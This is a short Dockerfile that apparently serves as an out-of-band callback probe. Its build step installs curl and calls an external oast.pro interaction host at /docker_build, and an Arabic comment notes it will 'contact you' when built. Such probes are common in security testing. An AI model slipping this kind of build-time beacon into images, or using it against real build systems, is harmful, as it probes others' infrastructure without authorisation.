FROM alpine:latest
# أول ما يبدأ يبني، هيحاول يكلمك
RUN apk add --no-cache curl && curl http://d51fn6g3t4gn82v0tqfgmbwxwgb7xhha5.oast.pro/docker_build
